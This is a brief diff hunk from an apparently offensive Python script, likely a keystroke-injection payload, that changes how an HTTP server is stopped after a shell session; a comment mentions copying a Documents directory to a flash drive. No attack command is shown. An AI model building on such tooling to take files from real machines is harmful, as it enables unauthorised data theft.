@@ -94,7 +94,7 @@ def payload(web_dir):
 	print("Shell exited")
 	# Copy Documents Directory to Flash Drive
 	httpd.server_close()
-	httpd.shutdown()
+	httpd.close()
 	httplistener.join()
 	eco.type("exit")
 	eco.press("ENTER")
